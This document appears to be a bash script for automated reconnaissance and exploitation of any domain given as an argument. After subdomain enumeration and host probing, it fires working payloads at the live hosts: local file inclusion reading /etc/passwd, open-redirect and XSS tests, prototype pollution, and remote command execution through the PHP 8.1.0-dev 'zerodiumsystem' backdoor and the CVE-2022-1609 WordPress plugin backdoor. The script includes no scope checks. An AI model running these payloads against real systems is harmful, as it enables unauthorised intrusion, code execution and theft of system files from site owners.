TARGET=$1
COLLABORATOR=$2
sleep 1;
echo '\e[93m Amass Scan'
curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u | tee -a TARGET.txt
cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done
cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d ':' -f 1 | sort -u | tee -a TARGET.txt
assetfinder --subs-only $TARGET  | tee -a TARGET.txt
subfinder -d $TARGET | tee -a TARGET.txt
sleep 2;
echo '\033[0m sorting the subdomains'
sleep 2;
cat TARGET.txt | sort -u | tee -a SORTED_TARGETS.txt
sleep 2;
echo '\033[0;31m Testing for subdomain Takeovers'
subjack -w SORTED_TARGETS.txt | tee -a SUBJACK_OUTPUT.txt
subjack -w SORTED_TARGETS.txt -ssl | tee -a SUBJACK_OUTPUT_SSL.txt
echo '\033[0;32m VERIFYING VALID TARGETS'
echo 'http:80' > probe.txt
echo 'http:8080' >> probe.txt
echo 'https:443' >> probe.txt
echo 'https:8443' >> probe.txt
echo 'http:9000' >> probe.txt
echo 'http:9001' >> probe.txt
echo 'http:9002' >> probe.txt
echo 'http:9003' >> probe.txt
cat probe.txt
sleep 1;
echo '\033[0;31m Testing for valid targets'
for i in $(cat probe.txt); do 
	cat SORTED_TARGETS.txt | httprobe -c 50 --prefer-https -p $i | tee -a VALID_PROBED_TARGETS.txt; done
echo '\033[0;34m SORTING THE PROBED TARGETS AND OUTPUT IN VALID_PROBED_SORTED.txt'
cat VALID_PROBED_TARGETS.txt | sort -u | tee -a VALID_PROBED_SORTED.txt
sleep 3;
for i in $(cat VALID_PROBED_SORTED.txt); do
	ffuf -w /opt/password_sensitive_files.txt:FUZZ -u $i:FUZZ -s | grep 'Status: 200' ; done
echo '\033[0;35m TESTING FOR WAYBACKURLS'
cat VALID_PROBED_SORTED.txt | waybackurls | tee -a WAYBACKURLS.txt
sleep 2;
echo '\033[0;31m Testing for LFI'
cat WAYBACKURLS.txt| gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 bash -c 'curl -s "%" | grep -1 "root:x" && echo "VULN! %"' 
sleep 2;
echo '\033[0;32m Testing for OPEN-REDIRECT'
export LHOST="$2"
cat WAYBACKURLS.txt | gf redirect | qsreplace "$LHOST" | xargs -I% -P 25 bash -c 'curl -Is "%" 2>&1 | grep -q "Location:$LHOST" && echo "VULN! %"'
echo '\e[93m Testing for xSS'
gospider -S VALID_PROBED_SORTED.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
echo 'test for Prototype Pollution'
sed 's/$/\/?__proto__[testparam]=exploit\//' VALID_PROBED_SORTED.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
echo 'TEST FOR CVE-2022-0378'
cat VALID_PROBED_SORTED.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
echo -e "Scanning for template based vulnerabilities"
nuclei -update-templates &> /dev/null
mkdir nuclei_output/
cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity low -c 200 -silent; done | anew -q nuclei_output/low.txt
cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity medium -c 200 -silent; done | anew -q nuclei_output/medium.txt
cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity high -c 200 -silent; done | anew -q nuclei_output/high.txt
cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity critical -c 200 -silent; done | anew -q nuclei_output/critical.txt

echo '\033[0m LETS TEST FOR XSS'
cat WAYBACKURLS.txt | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep '=' | qsreplace "<img src=x onerror=alert(1)>" | ~/go/bin/httpx -silent -nc -mr "<img src=x onerror=alert(1)>" -mc 200

sleep 3;
echo '\033[0;33m LOOKING FOR ADMIN CONSOLES'
cat VALID_PROBED_SORTED.txt | httpx -path /web-console/ -status-code -title -nc -t 250 -mc 200
echo '\033[0;34m TESTING FOR LFI'
cat WAYBACKURLS.txt | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 
sleep 3;
cat VALID_PROBED_SORTED.txt | ~/go/bin/httpx -H "Accept: ../../../../../../../../etc/passwd{{" -t 50 -nc -silent -mr "root:x" 
ffuf -w "VALID_PROBED_SORTED.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
sleep 2;
echo '\033[0;31m TESTING FOR PHP 8.1.0-dev'
cat VALID_PROBED_SORTED.txt | ~/go/bin/httpx -H "User-Agentt: zerodiumsystem('cat /etc/passwd');" -t 50 -nc -silent -mr "root:x"
sleep 2;
echo '\033[0;37m Sensitive Files Bruteforce'
for hosts in $(cat VALID_PROBED_SORTED.txt); do ffuf -w /opt/sensitive_files.txt:FUZZ -u $hosts/FUZZ -fc 404,401,403,500,302,301 ; done
sleep 2;
echo '\033[0;36m CVE-2022-1609 WORDPRESS WEBLIZAR BACKDOOR'
for private in $(cat VALID_PROBED_SORTED.txt); do curl -s -d 'blowfish=1' -d "blowf=system('cat /etc/passwd');" 'http://$private/wp-json/am-member/license'| grep -i 'root:x'; done

